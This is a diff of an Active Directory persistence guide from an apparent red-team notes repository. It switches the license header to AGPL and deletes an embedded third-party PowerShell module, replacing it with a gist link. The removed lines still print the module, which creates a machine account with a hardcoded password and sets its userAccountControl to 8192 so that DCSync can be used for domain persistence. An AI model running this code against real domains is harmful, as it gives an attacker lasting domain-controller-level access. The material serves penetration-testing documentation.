@@ -1,13 +1,14 @@
 <!---------------------------------------------------------------------------------
 Copyright: (c) BLS OPS LLC.
 This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, version 3.
+it under the terms of the GNU Affero General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-GNU General Public License for more details.
-You should have received a copy of the GNU General Public License
+GNU Affero General Public License for more details.
+You should have received a copy of the GNU Affero General Public License
 along with this program. If not, see <https://www.gnu.org/licenses/>.
 --------------------------------------------------------------------------------->
 # AD Advanced Persistence
@@ -256,33 +257,8 @@ Tools
 				* PentestLab Blog -<br />[https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/](https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/)
 			* Process
 				1. Create the following PowerShell module.
-
-						function Execute-userAccountControl
-						{
-						[CmdletBinding()]
-						        param
-						        (
-						                [System.String]$DomainFQDN = $ENV:USERDNSDOMAIN,
-						                [System.String]$ComputerName = 'Pentestlab',
-						                [System.String]$OSVersion = '10.0 (18363)',
-						                [System.String]$OS = 'Windows 10 Enterprise',
-						                [System.String]$DNSName = "$ComputerName.$DomainFQDN",
-						$MachineAccount = 'Pentestlab'
-						        )
-						$secureString = convertto-securestring "Password123" -asplaintext -force
-						$VerbosePreference = "Continue"
-						 
-						Write-Verbose -Message "Creating Computer Account: $ComputerName"
-						New-ADComputer $ComputerName -AccountPassword $securestring -Enabled $true -OperatingSystem $OS -OperatingSystemVersion $OS_Version -DNSHostName
-						$DNSName -ErrorAction Stop;
-						Write-Verbose -Message "$ComputerName created!"
-						Write-Verbose -Message "Attempting to establish persistence."
-						Write-Verbose -Message "Changing the userAccountControl attribute of $MachineAccount computer to 8192."
-						Set-ADComputer $MachineAccount -replace @{ "userAccountcontrol" = 8192 };
-						Write-Verbose -Message "$MachineAccount is now a Domain Controller!"
-						Write-Verbose -Message "Domain persistence established!You can now use the DCSync technique with Pentestlab credentials."
-						$VerbosePreference = "Continue"
-						}
+						Removed by Black Lantern Security on 2026-10-23: third-party Execute-userAccountControl PowerShell module by netbiosX,
+						no license found. Obtain it from https://gist.github.com/netbiosX/089a9d97a4f60016a6935500f328c17c. See THIRD_PARTY_NOTICES.md.
 				1. Execute the  Module
 
 						Import-Module .\userAccountControl.ps1
